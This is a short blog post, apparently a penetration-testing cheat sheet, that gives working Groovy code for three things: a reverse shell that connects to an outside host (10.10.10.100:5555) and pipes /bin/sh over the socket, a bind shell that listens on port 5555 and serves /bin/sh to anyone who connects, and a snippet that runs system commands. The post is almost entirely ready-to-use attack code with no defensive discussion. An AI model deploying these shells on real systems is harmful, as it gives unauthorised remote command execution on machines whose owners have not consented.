---
layout: post
title: "Groovy reverse and bind shells"
date: 2018-03-12 16:06:06
tags: groovy
description: How to create reverse and cmd shells using groovy console or execute a system command.
comments: true
---

## Groovy reverse shell
>Groovy reverse shell
{:.filename}
{% highlight groovy %}
String host="10.10.10.100";
int port=5555;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
{% endhighlight %}

## Groovy bind shell
>Groovy bind shell
{:.filename}
{% highlight groovy %}
int port=5555;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
{% endhighlight %}

## Groovy command execution
>Execute a system command using groovy
{:.filename}
{% highlight groovy %}
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'ls'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
{% endhighlight %}
